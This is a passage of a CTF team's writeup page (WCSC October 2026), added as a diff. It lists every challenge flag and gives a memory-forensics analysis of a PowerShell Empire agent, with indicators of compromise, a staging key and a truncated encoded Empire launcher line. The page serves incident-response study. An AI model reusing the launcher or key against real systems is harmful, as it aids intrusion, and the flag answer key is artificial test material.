@@ -1,0 +1,1430 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta name="robots" content="index,follow" />
+<meta name="description" content="Lee Seonghyeon (이성현) — 2026 WCSC October CTF (1st place) full solution report." />
+<title>WCSC October 2026 CTF · Writeup — Lee Seonghyeon</title>
+<link rel="icon" href="/favicon.svg" type="image/svg+xml" />
+<style>
+  :root { color-scheme: dark; }
+  * { box-sizing: border-box; }
+  body { margin: 0; background: #000; color: #e6e9ee; font-family: Georgia, "Times New Roman", serif; }
+  .topbar { position: sticky; top: 0; z-index: 10; display: flex; align-items: center; gap: 1rem; padding: .85rem clamp(1rem, 4vw, 2rem); background: rgba(0,0,0,.82); backdrop-filter: saturate(140%) blur(10px); border-bottom: 1px solid #1d1f22; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; }
+  .topbar a { color: #a3a3a3; font-size: .78rem; font-weight: 600; letter-spacing: .02em; text-decoration: none; }
+  .topbar a:hover, .topbar a:focus-visible { color: #f5f5f5; text-decoration: underline; text-underline-offset: .25em; }
+  .topbar .sep { color: #3a3a3a; }
+  main { width: min(860px, calc(100% - 3rem)); margin: 0 auto; padding: clamp(2.5rem, 7vh, 5rem) 0 6rem; }
+  h1, h2, h3, h4 { color: #f5f5f5; font-weight: 500; letter-spacing: -.02em; line-height: 1.2; }
+  h1 { font-size: clamp(1.9rem, 4.5vw, 2.9rem); margin: 0 0 1.5rem; }
+  h2 { font-size: 1.6rem; margin: 3rem 0 1rem; padding-top: 2.25rem; border-top: 1px solid #1d1f22; }
+  h3 { font-size: 1.2rem; margin: 2rem 0 .75rem; }
+  h4 { font-size: 1rem; margin: 1.5rem 0 .6rem; color: #d1d5da; }
+  p, li { font-size: 1rem; line-height: 1.75; color: #e6e9ee; }
+  a { color: #7aa7ff; text-decoration: underline; text-underline-offset: .18em; overflow-wrap: anywhere; }
+  strong { color: #f0f2f4; }
+  ul, ol { padding-left: 1.3rem; }
+  li + li { margin-top: .4rem; }
+  hr { margin: 3rem 0; border: 0; border-top: 1px solid #1d1f22; }
+  code { padding: .12em .35em; border-radius: 4px; color: #f3f5f5; background: #1a1c1f; font-family: ui-monospace, SFMono-Regular, Consolas, monospace; font-size: .86em; overflow-wrap: anywhere; word-break: break-word; }
+  pre { margin: 1.25rem 0; overflow-x: auto; padding: 1.1rem 1.2rem; border: 1px solid #25282c; border-radius: 8px; background: #121416; }
+  pre code { display: block; min-width: max-content; padding: 0; color: #d7dadf; background: none; font-size: .8rem; line-height: 1.6; word-break: normal; overflow-wrap: normal; }
+  table { width: 100%; margin: 1.25rem 0; border-collapse: collapse; color: #e1e4e8; font-size: .9rem; text-align: left; display: block; overflow-x: auto; }
+  th, td { padding: .65rem .6rem; border-bottom: 1px solid #25282c; vertical-align: top; }
+  th { color: #a3a3a3; font-size: .74rem; font-weight: 650; letter-spacing: .04em; text-transform: uppercase; white-space: nowrap; }
+  .toc { margin: 2rem 0 0; padding: 1.1rem 1.3rem; border: 1px solid #25282c; border-radius: 10px; background: #0d0f11; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; }
+  .toc ul { padding-left: 1.1rem; } .toc li { font-size: .9rem; }
+  @media (max-width: 480px) { main { width: calc(100% - 2rem); } h1 { font-size: 1.7rem; } p, li { font-size: .95rem; } }
+</style>
+</head>
+<body>
+<nav class="topbar">
+  <a href="/#research">← Writeups</a>
+  <span class="sep">·</span>
+  <a href="/">ihopenre.is-a.dev</a>
+</nav>
+<main>
+<h1 id="2026-wcsc-october-ctf-solution-report">2026 WCSC October CTF — Solution Report</h1>
+<p><strong>Team:</strong> ihopenre
+<strong>Date:</strong> 2026-10-30</p>
+<h2 id="table-of-contents">Table of Contents</h2>
+<ol>
+<li>[Forensics/IR] The Empire Strikes Back (750) / The Empire's Last Orders</li>
+<li>[OSINT] Here and There — 500</li>
+<li>[Web] Anything for Our Members — 750</li>
+<li>[Web] Moth Busters — 500</li>
+<li>[Web] Fruit Shop — 250</li>
+<li>[Web] Jinja2Ninja — 250</li>
+<li>[Misc/Network] Plenty of Portals — 250</li>
+<li>[Misc/Network] The Curious — 500</li>
+<li>[Pwn] Bookshelves — 250</li>
+<li>[Pwn] Dewey Decimal — 375</li>
+<li>[Crypto] Overrated — 500</li>
+<li>[Blockchain/Crypto] Sell Your Ethereum — 750</li>
+<li>[OSINT] Luna's Nite Out — 1000</li>
+<li>[Forensics/Stego] Leonne Stratvarius Bonnie (kitty) — 250</li>
+</ol>
+<h2 id="flag-summary">Flag Summary</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Challenge</th>
+<th>Flag</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>[Forensics/IR] The Empire's Last Orders</td>
+<td><code>WCSC{echoes_in_freed_memory_64795e1b}</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td>[Forensics/IR] The Empire Strikes Back — 750</td>
+<td><code>WCSC{a_window_into_the_intrusion_42fad758}</code></td>
+</tr>
+<tr>
+<td>3</td>
+<td>[OSINT] Here and There — 500</td>
+<td><code>WCSC{1210}</code></td>
+</tr>
+<tr>
+<td>4</td>
+<td>[Web] Anything for Our Members — 750</td>
+<td><code>WCSC{S0_MuCh_S3rvEr_S1d3_Inf0rm47ioN!!!!}</code></td>
+</tr>
+<tr>
+<td>5</td>
+<td>[Web] Moth Busters — 500</td>
+<td><code>WCSC{Ps1F1v31nf0L4b5_V1b3_C0d35_4lL}</code></td>
+</tr>
+<tr>
+<td>6</td>
+<td>[Web] Fruit Shop — 250</td>
+<td><code>WCSC{m4nG03z_4nD_M0ngOs}</code></td>
+</tr>
+<tr>
+<td>7</td>
+<td>[Web] Jinja2Ninja — 250</td>
+<td><code>WCSC{7h15_SSTI_15_s0_r4d}</code></td>
+</tr>
+<tr>
+<td>8</td>
+<td>[Misc/Network] Plenty of Portals — 250</td>
+<td><code>WCSC{W0rk1ng_W_P0rtAl5_Th3_C4k3_W4s_A_l13}</code></td>
+</tr>
+<tr>
+<td>9</td>
+<td>[Misc/Network] The Curious — 500</td>
+<td><code>WCSC{UR_2_FuR1oU5}</code></td>
+</tr>
+<tr>
+<td>10</td>
+<td>[Pwn] Bookshelves — 250</td>
+<td><code>WCSC{c4n7_f17_0n_7h3_5h3lv35!}</code></td>
+</tr>
+<tr>
+<td>11</td>
+<td>[Pwn] Dewey Decimal — 375</td>
+<td><code>WCSC{d3w3y_h45_4_5y573m}</code></td>
+</tr>
+<tr>
+<td>12</td>
+<td>[Crypto] Overrated — 500</td>
+<td><code>WCSC{jwt_overrated}</code></td>
+</tr>
+<tr>
+<td>13</td>
+<td>[Blockchain/Crypto] Sell Your Ethereum — 750</td>
+<td><code>WCSC{4626_inflation_rounding_success_2026}</code></td>
+</tr>
+<tr>
+<td>14</td>
+<td>[OSINT] Luna's Nite Out — 1000</td>
+<td><code>WCSC{47.6883_9.1406}</code></td>
+</tr>
+<tr>
+<td>15</td>
+<td>[Forensics/Stego] Leonne Stratvarius Bonnie (kitty) — 250</td>
+<td><code>WCSC{kitty_cat_meow_csc}</code></td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h2 id="1-forensicsir-the-empire-strikes-back-750-the-empires-last-orders">1. [Forensics/IR] The Empire Strikes Back (750) / The Empire's Last Orders</h2>
+<p><strong>One-line summary:</strong> The user <code>analyst</code> downloaded <code>Package-Capa.7z</code> over cleartext HTTP. Inside it was an encrypted archive whose password was the raw base64 string from <code>flag.txt</code>. That archive contained a PowerShell Empire C# agent (<code>capa.exe</code>), which was executed. From the memory dump we recovered (1) the <code>FG=</code> value in the environment block of the decoy process <code>SessionWorker.exe</code> — the <em>Last Orders</em> flag — and (2) a reflectively loaded .NET assembly whose name was a base64 string stored in UTF-16 — the <em>Strikes Back</em> flag.</p>
+<h3 id="shared-information">Shared information</h3>
+<ul>
+<li>Original challenge text: <code>challenges/wcsc-empire/README.md</code>. Everything below is restricted to facts confirmed through <code>notes/wcsc-empire.md</code> and the evidence files.</li>
+<li>Provided: <code>Extraction.7z</code> (~5 GB, KAPE-style triage collection plus a memory dump) and a separately downloaded <code>Dump.pcapng</code>. The triage set does <strong>not</strong> contain the Downloads folder or the pcap (only a <code>DUMPCAP.EXE</code> prefetch entry).</li>
+<li>Host <code>DESKTOP-SVH6UVO</code>, user <code>analyst</code>.</li>
+<li>Memory dump: <code>C/DESKTOP-SVH6UVO-20261022-195810.dmp</code> (PAGEDU64, 4,274,925,568 bytes), SystemTime 2026-10-22 19:58:12 UTC.</li>
+<li>pcap: <code>Dump.pcapng</code> (9.4 MB), 2026-10-22 19:51:52 – 19:52:47 UTC.</li>
+<li>Flag format: <code>WCSC{...}</code></li>
+</ul>
+<h3 id="timeline-utc-kst-kst-utc9">Timeline (UTC / KST, KST = UTC+9)</h3>
+<table>
+<thead>
+<tr>
+<th>Time (UTC)</th>
+<th>Time (KST)</th>
+<th>Event</th>
+<th>Evidence</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>2026-10-22 19:51:52</td>
+<td>2026-10-23 04:51:52</td>
+<td>pcap capture starts</td>
+<td><code>Downloads/Dump.pcapng</code></td>
+<td></td>
+</tr>
+<tr>
+<td>2026-10-22 19:51:52–19:52:47</td>
+<td>2026-10-23 04:51:52–04:52:47</td>
+<td><code>GET hxxp://10.226.206[.]191:8000/Package-Capa.7z</code> (cleartext HTTP)</td>
+<td><code>Dump.pcapng</code>, <code>evidence/wcsc-empire/http_objects/Package-Capa.7z</code></td>
+<td>25,053 bytes; matches the size carved from memory. Exact per-request timestamps not determined.</td>
+</tr>
+<tr>
+<td>unknown</td>
+<td>unknown</td>
+<td><code>Package-Capa.7z</code> extracted; <code>Secret-Package.7z</code> opened with the raw base64 from <code>flag.txt</code></td>
+<td>7z references in memory, <code>7ZR.EXE</code> prefetch</td>
+<td>Exact time not determined</td>
+</tr>
+<tr>
+<td>2026-10-22 19:57:26</td>
+<td>2026-10-23 04:57:26</td>
+<td><code>capa.exe</code> executed (PID 8188)</td>
+<td><code>evidence/wcsc-empire/vol_pslist.txt</code>, <code>vol_pstree.txt</code></td>
+<td></td>
+</tr>
+<tr>
+<td>2026-10-22 19:57:48</td>
+<td>2026-10-23 04:57:48</td>
+<td><code>capa.exe</code> spawns <code>SessionWorker.exe</code> (PID 6720, argument <code>1800</code>)</td>
+<td><code>vol_pslist.txt</code> (CreateTime), <code>vol windows.cmdline</code></td>
+<td>Still running at dump time (8 threads)</td>
+</tr>
+<tr>
+<td>2026-10-22 19:57:57</td>
+<td>2026-10-23 04:57:57</td>
+<td><code>capa.exe</code> exits (PID 8188)</td>
+<td><code>vol_pslist.txt</code></td>
+<td></td>
+</tr>
+<tr>
+<td>2026-10-22 19:58:12</td>
+<td>2026-10-23 04:58:12</td>
+<td>Memory dump taken (SystemTime)</td>
+<td>dump header</td>
+<td>Dump filename says 195810</td>
+</tr>
+</tbody>
+</table>
+<p>Note: the pcap ends at 19:52, so no C2 traffic to <code>192.168.175[.]128</code> appears in it.</p>
+<h3 id="attack-chain">Attack chain</h3>
+<ol>
+<li><strong>Initial delivery:</strong> <code>analyst</code> downloaded <code>Package-Capa.7z</code> from an external host over cleartext HTTP. The directory listing on that server (<code>10.226.206[.]191:8000</code>) contained only this file. A reverse lookup to <code>eduroam-226-206-191.laptops.usf.edu</code> is recorded in the notes, but the raw lookup output is not in the evidence set.</li>
+<li><strong>Social engineering:</strong> <code>flag.txt</code> inside the archive reads "The archive is sealed. Maybe the flag you found nearby is the key it's waiting for." together with a base64 string. <strong>That raw base64 string is the password</strong> for <code>Secret-Package.7z</code>. The decoded <code>WCSC{...}</code> value is <em>not</em> the password.</li>
+<li><strong>Execution:</strong> <code>Secret-Package/capa.exe</code> (named to impersonate the legitimate <code>capa</code> tool) was executed. Identified as a PowerShell Empire C# agent (Sharpire family).</li>
+<li><strong>Decoy process:</strong> <code>capa.exe</code> spawned <code>%LOCALAPPDATA%\Temp\ApplicationTelemetry\&lt;GUID-like folder&gt;\SessionWorker.exe 1800</code>. This is a tiny .NET program that only reads an environment variable and sleeps.</li>
+<li><strong>Persistence:</strong> not established. The scheduled tasks we initially suspected turned out to be lab automation (see "Ruled out" below).</li>
+<li><strong>C2:</strong> <code>192.168.175[.]128</code> over HTTP. We could not recover any actual traffic to this C2.</li>
+<li><strong>In-memory module:</strong> the dump contains the name of a reflectively loaded .NET assembly that does not exist on disk (the <em>Strikes Back</em> flag). We assess it was loaded via Empire's <code>RunAssemblyInProcess</code> — this is an inference, not a confirmed fact.</li>
+<li><strong>Privilege escalation / lateral movement / exfiltration:</strong> not established.</li>
+</ol>
+<h3 id="indicators-of-compromise-iocs">Indicators of Compromise (IoCs)</h3>
+<p><strong>Files / paths</strong>
+- <code>C:\Users\analyst\Downloads\Package-Capa\Package-Capa\flag.txt</code> (held open by Notepad, PID 11416)
+- <code>C:\Users\analyst\Downloads\Package-Capa\Package-Capa\Secret-Package\capa.exe</code> (PID 8188)
+- <code>C:\Users\analyst\AppData\Local\Temp\ApplicationTelemetry\dc0b758ea8c544068e0555042765aa8c\SessionWorker.exe</code> (decoy, PID 6720); prefetch: <code>C/Windows/prefetch/SESSIONWORKER.EXE-45532A12.pf</code></p>
+<p><strong>Hashes</strong>
+- <code>Secret-Package/capa.exe</code> (58,880 B) SHA-256: <code>4fac75bc9c4b8dc40265e71b73378551dbe56884f7787c8e112797a4206eabba</code>
+- <code>Package-Capa.7z</code> (25,053 B) SHA-256: <code>edc51181b23b37701ac566550f6ce4eadb4c16fe5320362ecaba33db3eceff72</code>
+- <code>Secret-Package.7z</code> (24,688 B) SHA-256: <code>156856d09e87163defca0ab7fc425245444523b2373cd7d8032297ff344269aa</code>
+- <code>flag.txt</code> (144 B) SHA-256: <code>237162bc2730731717150dd005b80b88cca4d716c4c2538b0399c4894aa1a4df</code>
+- <code>SessionWorker.exe</code> (image extracted from the memory dump, 24,576 B) SHA-256: <code>aeeb47e3ad182a438d3834fef2c48f79ad74d43d0886344fd3963eb737a1a0e9</code> (on-disk original hash not verified)</p>
+<p><strong>Network</strong>
+- Delivery server: <code>hxxp://10.226.206[.]191:8000/Package-Capa.7z</code>, reverse name <code>eduroam-226-206-191[.]laptops[.]usf[.]edu</code>
+- C2: <code>hxxp://192.168.175[.]128/</code>
+- Empire default URIs: <code>/admin/get.php</code>, <code>/news.php</code>, <code>/login/process.php</code>
+- User-Agent: <code>Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko</code>
+- Staging key: <code>2mQIKCB4WdvqyA3qtBevpBfnXXeTc7jH</code> (extracted from <code>capa.exe</code>)
+- Sysmon surfaced the external IP <code>89.106.20[.]205</code> as a candidate, but we could not establish whether it is malicious.</p>
+<p><strong>In-memory</strong>
+- Assembly name <code>V0NTQ3thX3dpbmRvd19pbnRvX3RoZV9pbnRydXNpb25fNDJmYWQ3NTh9</code>
+- Empire launcher remnants: <code>-noP -sta -w 1 -enc SQBmACgAJABQAFMAVg...</code> (<code>evidence/wcsc-empire/enc_scan2.txt</code>)</p>
+<p><strong>Scheduled tasks / services / accounts:</strong> nothing confirmed malicious (this is a finding, not an unknown: the review showed only lab automation). No created accounts were identified.</p>
+<hr>
+<h3 id="part-1-the-empires-last-orders">Part 1 — The Empire's Last Orders</h3>
+<h4 id="1-problem-summary">1. Problem summary</h4>
+<ul>
+<li>Provided: <code>Extraction.7z</code> (KAPE triage + memory dump)</li>
+<li>Goal: a hidden flag (<code>WCSC{...}</code>)</li>
+</ul>
+<h4 id="2-analysis">2. Analysis</h4>
+<ul>
+<li>In the triage set, <code>ConsoleHost_history.txt</code> and scheduled-task XML pointed at <code>C:\ProgramData\LabWorker\Windows-Executor.ps1</code> and the tasks <code>LocalWorker</code> / <code>LocalWorkerWatchdog</code>. These turned out to be lab automation (see "Ruled out").</li>
+<li>Scanning the whole memory dump in both ASCII and UTF-16LE produced <code>WCSC{echoes_in_freed_memory_64795e1b}</code>. The surrounding context is a process environment block (PEB environment): <code>FG=WCSC{...}</code> followed by <code>PATH</code>, <code>SystemRoot</code>, <code>TEMP</code>, <code>TMP</code>, <code>WINDIR</code>.</li>
+<li>The same context revealed the <code>SessionWorker.exe</code> path, and execution was cross-confirmed via the prefetch file <code>SESSIONWORKER.EXE-45532A12.pf</code>.</li>
+<li>Occurrences in the dump: 5 in ASCII, 4 in UTF-16LE. Offsets are in <code>evidence/wcsc-empire/flag_offsets.txt</code>.</li>
+<li>As the flag name suggests, the environment block of a terminated process was still resident in freed memory.</li>
+</ul>
+<h4 id="3-steps">3. Steps</h4>
+<ol>
+<li>Review the triage artifacts (<code>ConsoleHost_history</code>, scheduled-task XML, event logs).</li>
+<li>Full string search over the memory dump. Define the variables yourself:</li>
+</ol>
+<pre><code class="language-bash">cd /home/lsh/whitehat2026-workspace
+DUMP=challenges/wcsc-empire/ex/C/DESKTOP-SVH6UVO-20261022-195810.dmp   # extracted via 7z x Extraction.7z
+harness/sb &quot;strings -a -t d $DUMP | grep -F 'WCSC{'&quot;
+harness/sb &quot;strings -el -a -t d $DUMP | grep -F 'WCSC{'&quot;
+</code></pre>
+<ol start="3">
+<li>Dump the context around each offset: <code>python3 -I tools/wcsc-empire/ctx_dump.py "$DUMP" &lt;offset...&gt;</code> (this tool reads 3,000 bytes before and 6,000 bytes from the offset and prints ASCII/UTF-16 strings). The <code>-t d</code> flag above yields decimal offsets, which can be passed directly.</li>
+<li>Process confirmation: <code>evidence/wcsc-empire/vol_pslist.txt</code>, <code>vol_pstree.txt</code> (volatility3 <code>windows.pslist</code> / <code>pstree</code> output).</li>
+</ol>
+<h4 id="4-result">4. Result</h4>
+<ul>
+<li><strong>Flag:</strong> <code>WCSC{echoes_in_freed_memory_64795e1b}</code></li>
+<li>Time obtained: 2026-10-30 14:20 UTC (23:20 KST) — first entry in <code>notes/FLAGS.md</code>; submission and scoring were done manually by the operator. The recorded time is converted from the workstation's local timezone (Asia/Bangkok, UTC+07).</li>
+<li>Evidence: <code>evidence/wcsc-empire/flag_offsets.txt</code></li>
+<li>Scoring: recorded in the notes as "confirmed correct". This flag was first submitted against <em>Strikes Back</em>, where it was rejected; it was correct for the sister challenge <em>Last Orders</em>.</li>
+</ul>
+<h4 id="5-root-cause-and-remediation">5. Root cause and remediation</h4>
+<ul>
+<li><strong>Classification:</strong> user-executed malicious archive (CWE-506, embedded malicious code family); sensitive data persisting in memory after process termination (CWE-226).</li>
+<li><strong>Remediation:</strong> block execution of archives from untrusted sources; block cleartext HTTP downloads; add detection for filename masquerading (<code>capa</code>, <code>ApplicationTelemetry</code>); capture memory during incident response.</li>
+</ul>
+<hr>
+<h3 id="part-2-the-empire-strikes-back-750">Part 2 — The Empire Strikes Back (750)</h3>
+<h4 id="1-problem-summary_1">1. Problem summary</h4>
+<ul>
+<li>Provided: the same <code>Extraction.7z</code> as Part 1</li>
+<li>Goal: a flag (<code>WCSC{...}</code>) derived from a malicious artifact in the dump</li>
+</ul>
+<h4 id="2-analysis_1">2. Analysis</h4>
+<ul>
+<li><strong>Observation:</strong> dumping <code>SessionWorker.exe</code> (<code>vol windows.pslist --pid 6720 --dump</code>) yielded a 24 KB PE32+ .NET binary referencing only <code>mscorlib</code> / <code>Environment</code> / <code>Thread</code>. It only calls <code>GetEnvironmentVariable</code> and <code>Thread.Sleep</code>, so it is a decoy rather than malware, and the <code>FG=</code> value it carries (the Part 1 flag) is not the answer here.</li>
+<li><strong>Actual chain:</strong> <code>vol windows.cmdline</code> confirmed PID 8188 <code>capa.exe</code>, PID 6720 <code>SessionWorker.exe</code>, and PID 11416 <code>Notepad.exe</code> (with <code>flag.txt</code> open).</li>
+<li>Recovered <code>flag.txt</code> from memory: <code>V0NTQ3tmb2xsb3dfdGhlX3N1cHBvcnRfaGFuZG9mZl82YTU1NjI2Nn0=</code> plus the "The archive is sealed..." text. Decoding gives <code>WCSC{follow_the_support_handoff_6a556266}</code> — an incorrect-answer breadcrumb.</li>
+<li>Extracted <code>Package-Capa.7z</code> from <code>Downloads/Dump.pcapng</code> (<code>tshark --export-objects http</code>). Contents: <code>flag.txt</code> + <code>Secret-Package.7z</code>, with the raw base64 as the password. The <code>capa.exe</code> inside is an Empire C# agent (feature strings: <code>AesEncryptThenHmac</code>, <code>BuildRoutingPacket</code>, <code>ChaCha20Poly1305</code>, <code>CheckAgentJobs</code>, <code>RunAssemblyInProcess</code>, <code>RunPowerShell</code>, etc.).</li>
+<li><strong>Key insight:</strong> the first pass searched for base64 only in ASCII. .NET stores strings as UTF-16, so a <code>V0NTQ3...</code> sequence has a NUL byte between every character and never matches an ASCII pattern. Re-running the search with <code>strings -el</code> produced a new string with 4 occurrences.</li>
+<li><strong>Location:</strong> dump offsets 2120233860, 2120234192, 3954008676, 3954009008 (<code>evidence/wcsc-empire/flag3_offsets.txt</code>). The surrounding data is a CLR assembly load list: <code>0v2wkbf1.mi4, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null</code>, <code>V0NTQ3thX3dp..., Version=0.0.0.0, ...</code> (the assembly name <em>is</em> the base64 flag), <code>System.Windows.Forms</code>, <code>System.Drawing</code>, <code>mscorlib</code>. This is a reflectively loaded assembly that exists only in memory, never on disk. The references to Windows.Forms/Drawing suggest screen-capture functionality (inference).</li>
+</ul>
+<h4 id="3-steps_1">3. Steps</h4>
+<pre><code class="language-bash">cd /home/lsh/whitehat2026-workspace
+DUMP=challenges/wcsc-empire/ex/C/DESKTOP-SVH6UVO-20261022-195810.dmp
+PCAP=challenges/wcsc-empire/Dump.pcapng   # copy of the separately downloaded file
+
+## 1) Extract HTTP objects from the pcap
+harness/sb &quot;tshark -r $PCAP --export-objects http,evidence/wcsc-empire/http_objects&quot;
+
+## 2) Extract the 7z; the password is the raw base64 from flag.txt
+harness/sb &quot;7z x -pV0NTQ3tmb2xsb3dfdGhlX3N1cHBvcnRfaGFuZG9mZl82YTU1NjI2Nn0= -oevidence/wcsc-empire/http_objects/secret evidence/wcsc-empire/http_objects/outer/Package-Capa/Secret-Package.7z&quot;
+
+## 3) Re-scan for UTF-16 strings (the step that found the answer)
+harness/sb &quot;strings -el -a -t d $DUMP | grep -F 'V0NTQ3'&quot;
+
+## 4) Decode
+echo 'V0NTQ3thX3dpbmRvd19pbnRvX3RoZV9pbnRydXNpb25fNDJmYWQ3NTh9' | base64 -d
+
+## 5) Inspect the surrounding context
+python3 -I tools/wcsc-empire/ctx_dump.py &quot;$DUMP&quot; 2120233860 3954008676
+</code></pre>
+<p><strong>Tools used (<code>tools/wcsc-empire/</code>):</strong></p>
+<ul>
+<li><code>evtx_scriptblocks.py</code> — reconstructs PowerShell 4104 script blocks from evtx (<code>python3 -I tools/wcsc-empire/evtx_scriptblocks.py &lt;evtx&gt; 4104</code>).</li>
+<li><code>fast_scan.py</code> — single pass over the dump looking for <code>WCSC{</code> under single-byte XOR/ADD, reversal, rot13, UTF-16BE and hex variants. This scan did <strong>not</strong> find it.</li>
+<li><code>scan_encodings.py</code> — <code>python3 -I tools/wcsc-empire/scan_encodings.py &lt;dump&gt;</code>; first version that ran 255 single-byte XOR passes with <code>mmap.find</code> (abandoned as too slow, replaced by <code>fast_scan.py</code>). Also did not find it.</li>
+<li>The search that actually succeeded was not a script but a one-liner: <code>strings -el $DUMP | grep -oE 'V0NTQ3[A-Za-z0-9+/=]{6,}'</code> (output: <code>evidence/wcsc-empire/enc_scan2.txt</code>).</li>
+<li><code>ctx_dump.py</code> — dumps ASCII/UTF-16 strings around a given offset.</li>
+</ul>
+<p><strong>Approaches ruled out (none produced a new <code>WCSC</code> hit):</strong> plaintext / UTF-16 / reversed / rot13 / hex / base64 (all three alignments) / single-byte XOR and ADD across the whole dump; ASCII + UTF-16 grep over all 769 triage files; plaintext, XOR, ADD, base64, repeating-key XOR with the staging key, and ChaCha20 decryption against <code>capa.exe</code>. <code>capa.exe</code> has no overlay, no extra sections and no resources.</p>
+<h4 id="4-result_1">4. Result</h4>
+<ul>
+<li><strong>Flag:</strong> <code>WCSC{a_window_into_the_intrusion_42fad758}</code></li>
+<li>Time obtained: 2026-10-30 15:08 UTC (2026-10-31 00:08 KST) — first entry in <code>notes/FLAGS.md</code>; submitted and confirmed correct by the operator. Converted from the workstation's local timezone (Asia/Bangkok, UTC+07).</li>
+<li>Evidence: <code>evidence/wcsc-empire/flag3_offsets.txt</code>, <code>evidence/wcsc-empire/capa_utf16_strings.txt</code>, <code>evidence/wcsc-empire/enc_scan2.txt</code></li>
+<li>Scoring: recorded in the notes as "confirmed correct 2026-10-30". No external lookups (VirusTotal etc.) were used.</li>
+</ul>
+<h4 id="5-root-cause-and-remediation_1">5. Root cause and remediation</h4>
+<ul>
+<li><strong>Classification:</strong> user-induced malware execution (CWE-506 family); reflective loading (fileless assembly).</li>
+<li><strong>Remediation:</strong> block untrusted archives; detect in-memory .NET assembly loads (ETW CLR load events); during memory forensics, search UTF-16 strings and encoding variants in addition to ASCII.</li>
+</ul>
+<h4 id="ruled-out-wrong-paths">Ruled out / wrong paths</h4>
+<p><strong><code>C:\ProgramData\LabWorker\Windows-Executor.ps1</code> and the <code>LocalWorker</code> / <code>LocalWorkerWatchdog</code> scheduled tasks</strong></p>
+<ul>
+<li>Why suspicious: logon trigger, <code>Bypass</code>, <code>HighestAvailable</code>, <code>-WindowStyle Hidden</code>.</li>
+<li>Correction: the task XML's <code>&lt;Hidden&gt;</code> element is <code>false</code> (<code>challenges/wcsc-empire/ex/C/Windows/System32/Tasks/LocalWorker</code>, line 34). Window hiding came from a script argument, not a task property.</li>
+<li>Correction: the payload encoding is not gzip+base64 but base64 JSON (<code>-RequestBase64 'eyJhY3Rpb24iOiJzdWJtaXQi...'</code> → <code>{"action":"submit","kind":"powershell",...}</code>).</li>
+<li>Conclusion: after reconstructing and reading 150 script blocks (event 4104), this is the lab's own IR automation — KAPE / Magnet DumpIt / KernelLiveDump deployment and network checks — i.e. the tooling that produced this evidence package. Across all 150 script blocks there are zero hits for <code>WCSC</code> and zero for <code>SessionWorker</code>. Note that only 4 payloads were read in full; the remainder were not individually reviewed. Basis: <code>evidence/wcsc-empire/decoded_payloads.txt</code>, <code>ps_scriptblocks.txt</code>.</li>
+</ul>
+<p><strong>The <code>FG=</code> value in <code>SessionWorker.exe</code></strong></p>
+<ul>
+<li>Initially treated as the answer to <em>Strikes Back</em>; it was rejected. The program is a decoy that only reads an environment variable and sleeps, and its value was the answer to the sister challenge <em>Last Orders</em>.</li>
+</ul>
+<p><strong><code>WCSC{follow_the_support_handoff_6a556266}</code></strong></p>
+<ul>
+<li>The decoded form of the base64 in <code>flag.txt</code>. It is not a submittable flag but a breadcrumb: the <strong>raw base64</strong> serves as the password for <code>Secret-Package.7z</code>. The notes record it as "submitted" and then resolved as incorrect.</li>
+</ul>
+<p><strong>Limitation of the first base64 scan:</strong> searching ASCII only missed the <code>V0NTQ3...</code> string stored as UTF-16.</p>
+<h4 id="limitations-and-open-items">Limitations and open items</h4>
+<ul>
+<li>Exact execution times for the download (somewhere inside the pcap window 19:51:52–19:52:47 UTC) and the 7z extraction were not determined. <code>SessionWorker.exe</code> creation is pinned at 19:57:48 UTC (pslist).</li>
+<li>Decryption of C2 traffic using the staging key was not attempted or not completed.</li>
+<li>The actual capability of the reflectively loaded assembly is an inference; the assembly body itself was not extracted.</li>
+<li>Hashes for <code>Package-Capa.7z</code> / <code>Secret-Package.7z</code> / <code>flag.txt</code> are from the copies carved out of the pcap. The on-disk originals (Downloads folder) are absent from the triage set and could not be compared.</li>
+</ul>
+<hr>
+<h2 id="2-osint-here-and-there-500">2. [OSINT] Here and There — 500</h2>
+<h3 id="1-problem-summary_2">1. Problem summary</h3>
+<ul>
+<li>Provided: a chat log and two images. No server.</li>
+<li>Sent by Jake: <code>Screenshot_2026-10-30_033847.png</code> (80 x 87 px)</li>
+<li>Sent by Jonathan: <code>VERT_IMG_0238.png</code> (2012 x 552 px)</li>
+<li>Conversation: Jonathan "wya" → Jake sends an image → Jonathan "wtf" → "just come meet me here" + image</li>
+<li>Task: locate both people, compute the great-circle (straight-line) distance between the two points in miles, rounded to the nearest 10.</li>
+<li>Driving/route distance is not used. Format: <code>WCSC{distance}</code></li>
+<li>Hints (100 points each): "Where Jonathan", "Where Jake?"</li>
+</ul>
+<p>Both images are barcodes, but of different kinds. PDF417 carries the data itself; a NaviLens tag carries only an ID that must be resolved against a server, so the registered information has to be looked up separately.</p>
+<h3 id="2-analysis_2">2. Analysis</h3>
+<h4 id="2-1-jonathan-pdf417-boarding-pass-iata-bcbp">2-1. Jonathan — PDF417 boarding pass (IATA BCBP)</h4>
+<p><code>VERT_IMG_0238.png</code> is a photograph of a printed PDF417 symbol. Decoded with <code>zxing-cpp</code>:</p>
+<pre><code>M1KARTWIDJAJA/JONATHANELT0N37 ORDFARUA 5679 298YOVSL0000 177&gt;8320OO6298BUA ...
+</code></pre>
+<p>Split into the fixed-width fields of IATA Resolution 792:</p>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Format Code / Legs</td>
+<td><code>M</code> / <code>1</code></td>
+<td>BCBP, 1 leg</td>
+</tr>
+<tr>
+<td>Passenger Name (20)</td>
+<td><code>KARTWIDJAJA/JONATHAN</code></td>
+<td></td>
+</tr>
+<tr>
+<td>Electronic Ticket Ind</td>
+<td><code>E</code></td>
+<td></td>
+</tr>
+<tr>
+<td>Operating carrier PNR (7)</td>
+<td><code>LT0N37</code></td>
+<td></td>
+</tr>
+<tr>
+<td>From City Airport (3)</td>
